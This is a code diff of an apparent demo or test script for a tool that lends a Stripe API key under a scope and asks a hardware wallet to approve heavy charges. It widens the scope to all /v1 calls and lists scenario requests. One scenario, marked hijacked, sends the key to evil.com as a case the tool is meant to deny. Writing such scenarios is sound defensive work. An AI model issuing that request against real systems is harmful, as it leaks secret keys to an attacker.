@@ -27,14 +27,15 @@ const skill = privateKeyToAccount('0x' + '33'.repeat(32))        // the tool's o
 const softHolder = privateKeyToAccount('0x' + '11'.repeat(32))   // stand-in when no Ledger is plugged in
 const KEY_LABEL = 'stripe-live'
 const KEY = keccak256(toHex(KEY_LABEL))
-const RANGE = { target: 'api.stripe.com', scope: 'POST /v1/charges' }
+// One loan covers both a quiet read and a heavy charge (decision 13): the real 0G judges by whether
+// money moves, not by the amount, so a $12 charge would wake the Ledger just like a $4,800 one.
+const RANGE = { target: 'api.stripe.com', scope: '* /v1' }
 const STANDING_USES = 10
 const now = () => Math.floor(Date.now() / 1000)
 
 // What the tool tries. `what` is the request in a person's words.
 const REQUESTS = {
-  usual: { what: 'Charge $12 — monthly plan, a regular customer', method: 'POST', url: 'https://api.stripe.com/v1/charges',
-    body: JSON.stringify({ amount: 1200, currency: 'usd', customer: 'cus_regular_monthly', description: 'Monthly plan' }) },
+  usual: { what: 'Read the account balance', method: 'GET', url: 'https://api.stripe.com/v1/balance' },
   heavy: { what: 'Charge $4,800 → an account nobody has seen before', method: 'POST', url: 'https://api.stripe.com/v1/charges',
     body: JSON.stringify({ amount: 480000, currency: 'usd', transfer_destination: 'acct_unknown' }) },
   'denied-host': { what: 'Send the key to evil.com', hijacked: true, method: 'POST', url: 'https://evil.com/v1/charges' },
